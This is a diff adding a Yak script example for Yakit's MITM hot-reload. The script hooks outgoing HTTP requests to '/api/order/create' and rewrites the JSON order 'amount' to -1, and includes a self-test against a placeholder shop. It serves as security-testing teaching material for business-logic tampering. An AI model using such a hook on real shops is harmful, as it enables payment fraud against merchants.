@@ -1,0 +1,76 @@
+/*
+示例: [请求劫持] hijackHTTPRequest 改写 JSON 字段
+关键词: hijackHTTPRequest, MITM 热加载, JSON 字段改写, forward, drop, 业务篡改
+适用场景: 前端把订单金额/折扣写死在 JS 校验里, 在出站前用 MITM 改写 JSON body 字段
+参考: yak-project-public 031 (2025-10-17) MITM 热加载全流程解析 场景一
+
+签名: hijackHTTPRequest(isHttps, url, req, forward, drop)
+  - forward(req): 把 (可能改写后的) 请求放行出站, 必须调用否则请求被挂起
+  - drop():       直接丢弃该请求
+注意: 未命中目标时也要 forward(原始 req), 保证其他流量与后续插件正常处理
+*/
+
+// ===== HOT PATCH TEMPLATE START =====
+TARGET_PATH = "/api/order/create"
+FIELD_NAME = "amount"
+NEW_VALUE = -1
+
+// 改写 JSON body 中的指定字段
+// 关键词: poc.GetHTTPPacketBody, json.loads, poc.ReplaceHTTPPacketBody
+modifyJSONField = func(req) {
+    body = poc.GetHTTPPacketBody(req)
+    if len(body) == 0 {
+        return req
+    }
+    params = json.loads(string(body))
+    if params == nil || !(FIELD_NAME in params) {
+        return req
+    }
+    params[FIELD_NAME] = NEW_VALUE
+    newBody = json.dumps(params, json.withIndent(""))
+    return poc.ReplaceHTTPPacketBody(req, newBody)
+}
+
+// MITM 请求劫持 hook
+// 关键词: hijackHTTPRequest, str.Contains, forward
+hijackHTTPRequest = func(isHttps, url, req, forward, drop) {
+    if !str.Contains(url, TARGET_PATH) {
+        forward(req)
+        return
+    }
+    forward(modifyJSONField(req))
+}
+
+/*
+========== 自测块 (YAK_MAIN 守卫) ==========
+- yak 命令行运行: YAK_MAIN = true, 执行 runSelfTest()
+- yakit MITM 热加载加载: YAK_MAIN = false, 自测块不执行, 仅注册 hook
+*/
+func runSelfTest() {
+    log.info("start hijack request modify json self test")
+
+    targetReq = sprintf("POST %s HTTP/1.1\r\nHost: shop.example.com\r\nContent-Type: application/json\r\n\r\n{\"amount\":100,\"product_id\":42}", TARGET_PATH)
+
+    captured = {"req": []byte(""), "dropped": false}
+    forward = func(b) { captured["req"] = b }
+    drop = func() { captured["dropped"] = true }
+
+    hijackHTTPRequest(false, "http://shop.example.com"+TARGET_PATH, []byte(targetReq), forward, drop)
+    assert !captured["dropped"], "target should not be dropped"
+    newParams = json.loads(string(poc.GetHTTPPacketBody(captured["req"])))
+    assert int(newParams.amount) == NEW_VALUE, "amount should be rewritten to NEW_VALUE"
+    assert int(newParams.product_id) == 42, "other fields should remain unchanged"
+    log.info("forwarded body: " + string(poc.GetHTTPPacketBody(captured["req"])))
+
+    otherReq := []byte("GET /api/healthz HTTP/1.1\r\nHost: shop.example.com\r\n\r\n")
+    captured["req"] = []byte("")
+    hijackHTTPRequest(false, "http://shop.example.com/api/healthz", otherReq, forward, drop)
+    assert string(captured["req"]) == string(otherReq), "non-target req should be forwarded unchanged"
+
+    log.info("hijack request modify json self test passed")
+}
+
+if YAK_MAIN {
+    runSelfTest()
+}
+// ===== HOT PATCH TEMPLATE END =====
